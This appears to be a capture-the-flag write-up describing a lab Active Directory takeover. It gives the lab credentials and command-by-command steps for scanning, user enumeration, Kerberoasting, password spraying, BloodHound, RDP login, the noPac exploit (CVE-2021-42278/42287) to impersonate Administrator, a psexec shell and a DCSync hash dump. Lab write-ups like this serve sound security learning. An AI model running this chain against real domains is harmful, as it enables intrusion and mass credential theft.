# Active Directory CTF Write-Up
in this challange we're given internal access with a set of credentials                                  
username: ctf.local\j.smith
password: JSmith@IT2024                                                                                  
and walks through logging in remotely to the machine via RDP -> then exploiting a vulnerability in  SeMachineAccount Privilege to obtain Domain Admin access

# Environment Set-Up:
Machine_IP: 10.112.130.201  
Before starting, DNS resolution must point to the Domain Controller. this is critical for Kerberos-based attacks, which we'll need later

# Host Discovery & Port Scan:
1. `nmap -sn 10.112.130.0/24 -T4`        to discover live hosts
<img width="797" height="291" alt="Screenshot 2026-08-31 215131" src="https://github.com/user-attachments/assets/add16d3a-f0bb-472b-95ff-b981d233dae6" />

2. `nmap -sV -sC -iL hosts.txt -oN fill_scan.txt -T4`    only 10.112.130.201 holds valuable information
<img width="1321" height="782" alt="Screenshot 2026-08-31 215157" src="https://github.com/user-attachments/assets/38023d41-59ba-4978-a747-a9e4b2541ef5" />

# Enumeration:
1. I started off with Username Enumeration and saved usernames to users.txt file for further enumeration  
`netexec smb 10.112.130.201 -u j.smith -p JSMITH@IT2024 --users`
<img width="1766" height="315" alt="Screenshot 2026-08-31 215238" src="https://github.com/user-attachments/assets/f4c8bb82-f06f-408b-a770-f916d0057d88" />

2. I enumerated SMB shares:  
  `netexec smb 10.112.130.201 -u j.smith -p JSmith@IT2024 --shares`
<img width="1732" height="292" alt="Pasted image 20260831215926" src="https://github.com/user-attachments/assets/69b4687d-1495-4158-bf07-a50ad5b5dba0" />
i tried to connect to each share but nothing is there

3. Kerberoasting:  
  `impacket/GetUserSPNs.py ctf.local/j.smith -dc-ip 10.112.130.201 -request`
<img width="1913" height="498" alt="Pasted image 20260831220101" src="https://github.com/user-attachments/assets/9435b05a-9a72-48a3-8fa5-88c602cb4cee" />
i got TGS-REP encrypted blob for user svc.helpdesk, but upon trying to crack it, no results

4. since password reuse is common in AD environment, i tried to spray the given password across users  
  `netexec smb 10.112.130.201 -u users.txt -p JSmith@IT2024 --continue-on-success`
<img width="1531" height="196" alt="Pasted image 20260901040842" src="https://github.com/user-attachments/assets/ed9a66f3-4d9a-45ce-b8d7-da03ed1cc494" />
No new findings


# BloodHound
1. collect domain information:  
  `bloodhound-python -c all -u j.smith -p JSmith@IT2024 -d ctf.local -ns 10.112.130.201 --zip`
<img width="997" height="460" alt="Pasted image 20260901013422" src="https://github.com/user-attachments/assets/5c09ca7b-3b19-4390-b514-cfc2d79f0730" />

2. run bloodhound & import the collected zip file  
  `bloodhound-start` -> access from 127.0.0.1:8080 -> login creds admin admin -> import the zip file

 found that user j.smith is a member of the "Remote Desktop Users" 
users of this group are allowed to login remotely via RDP  
	` xfreerdp3 /dynamic-resolution +clipboard /cert:ignore /u:j.smith /p:JSmith@IT2024 /v:10.112.130.201`
	and i successfully logged-in

# Living Off the Land
i opened cmd and check for groups and privielges:  
`whoami /all`           i discovered that i have `SeMachineAccountPrivilege`  
"SeMachineAccountPrivilege": is assigned by default to "Authenticated Users Group" and allows a user to create a "Computer Account Object" in AD (in the domain),  
through that computer account "$" you can exploit other vulnerabilities like (noPac/ Resource-Based Constrained Delegation)


# utilizing The "sAMAccountName" Spoofing Attack (noPac) / CVE-2021-42278 & CVE-2021-42287: 
Upon searching online on how to exploit this Privilege we find a tool that automate the process (noPac)  
https://github.com/Ridter/noPac  

What this tool does is:
1. Create a machine account (using SeMachineAccountPrivilege)
2. SamAccountName spoofing attack (CVE-2021-42278): exploits this CVE which allows a machine account to rename itself to look like a domain controller
3. KRB-UPN-Delegation abuse (CVE-2021-42287): exploit this CVE too, which allows requesting a TGT as administrator once the spoofed name matches the DC

# Exploitation:  
1. request a TGT impersonating Administrator
	`python noPac.py ctf.local/j.smith -dc-ip 10.112.130.201 --impersonate Administrator -use-ldap` ~~this will give you Administrator TGT stored in a .cchache file~~
<img width="1037" height="646" alt="Pasted image 20260901032527" src="https://github.com/user-attachments/assets/81fcd90e-04c2-4214-8d68-4bedf72d2356" />

2. point the .ccache file to the KRB5CCNAME environment variable, which will allow us to use the Administrator TGT wit subsequent tools  
	`export KRB5CCNAME=<.ccache_file_containing_TGT>`
<img width="663" height="65" alt="Screenshot 2026-09-01 032600" src="https://github.com/user-attachments/assets/211814ed-f67d-4644-8c06-ac5442517df7" />

3. Use PsExec to get a shell and obtain the flag
	`impacket/psexec.py ctf.local/j.smith@DC01.CTF.LOCAL -k -no-pass`
<img width="801" height="552" alt="Pasted image 20260901033654" src="https://github.com/user-attachments/assets/fe89649a-091b-4250-b791-8b6ac7fc4b76" />

-----------------------------

# Going beyond the CTF  
we perform a DCSync Attack (dumping the DC's NTDS.dit database):  
	`/impacket/secretsdump.py ctf.local/Administrator@DC01.CTF.LOCAL -k -no-pass`
	<img width="1917" height="783" alt="Pasted image 20260901034811" src="https://github.com/user-attachments/assets/4f2e789c-f21e-4a44-8e9f-cab3b0cd8ae0" />

	






	




















